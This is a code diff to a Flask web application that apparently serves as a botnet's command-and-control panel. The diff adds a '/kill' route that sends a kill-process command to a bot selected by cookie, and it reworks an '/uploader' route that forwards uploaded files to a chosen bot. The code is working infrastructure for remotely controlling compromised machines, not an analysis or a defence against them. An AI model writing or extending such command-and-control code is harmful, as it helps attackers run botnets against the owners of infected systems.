@@ -91,16 +91,25 @@ def is_safe_url(next):
 
 # Done with login stuff
 
+@app.route('/kill', methods=['POST','GET'])
+@login_required
+def kill_proc():
+    if 'bot' in request.cookies:
+        botnet.sendKillProc(request.cookies.get('bot'))
+        return json.dumps({"success": True})
+    return json.dumps({"success": False})
+
 @app.route('/uploader', methods=['POST'])
 @login_required
 def upload_file():
-    if request.method == 'POST':
-        f = request.files['file']
-        # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
-        if 'bot' in request.cookies:
-            botnet.sendFile(request.cookies.get('bot'),f.filename,f)
-        # TODO switch to in-progress instead of "success"
+    f = request.files['file']
+    # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
+    if 'bot' in request.cookies:
+        botnet.sendFile(request.cookies.get('bot'),f.filename,f)
         return json.dumps({"success": True})
+    return json.dumps({"success": False})
+    # TODO switch to in-progress instead of "success"
+
 
 
 @app.route('/downloader', methods=['GET','POST','DELETE'])
